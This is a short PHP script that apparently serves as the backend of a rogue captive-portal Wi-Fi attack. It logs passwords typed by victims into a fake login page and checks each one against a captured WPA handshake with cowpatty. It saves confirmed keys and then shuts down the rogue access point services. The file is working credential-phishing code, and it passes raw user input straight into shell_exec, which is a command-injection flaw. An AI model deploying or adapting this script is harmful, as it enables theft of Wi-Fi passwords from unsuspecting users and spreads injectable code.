<?php

$ATTEMPT_FILE = "/tmp/netspion/Wifi/captive_portal/attempt.txt";
$HIT_FILE = "/tmp/netspion/Wifi/captive_portal/hit.txt";
$CAP_FILE = "CAP_FILE_PATH";
$SSID = "WIFI_SSID";

$password = $_GET['pass_value'];

shell_exec("echo '$password' >> $ATTEMPT_FILE");

$command = shell_exec("cowpatty -f $ATTEMPT_FILE -r $CAP_FILE -s '$SSID' -v | grep 'The PSK is'");

if (empty($command)){
    echo json_encode("error");
}else{
    shell_exec("echo '$password' >> $HIT_FILE");
    echo json_encode("ok");
    shell_exec("killall lighttpd");
    shell_exec("killall hostapd");
    shell_exec("killall dnsmasq");
}

